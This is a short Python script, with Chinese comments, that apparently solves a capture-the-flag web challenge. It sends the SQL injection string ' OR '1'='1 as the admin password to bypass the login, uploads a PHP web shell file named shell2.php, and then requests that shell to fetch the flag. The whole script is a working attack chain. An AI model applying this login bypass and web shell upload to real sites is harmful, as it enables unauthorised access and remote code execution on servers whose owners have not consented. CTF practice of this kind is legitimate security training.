import requests

base_url = "http://challenge.bluesharkinfo.com:28343"
login_url = f"{base_url}/admin/login.php"
upload_url = f"{base_url}/upload.php"

# 创建session
session = requests.Session()

# 登录
print("登录中...")
data = {
    'username': 'admin',
    'password': "' OR '1'='1"
}
resp = session.post(login_url, data=data)

# 上传shell2
print("上传 shell2.php...")
files = {
    'shell': ('shell2.php', open('shell2.php', 'rb'), 'application/x-php')
}
resp = session.post(upload_url, files=files)
print(f"上传状态: {resp.status_code}")

# 访问shell2
print("\n访问 shell2.php 获取flag...")
resp = session.get(f"{base_url}/shell2.php")
print("=" * 60)
print(resp.text)
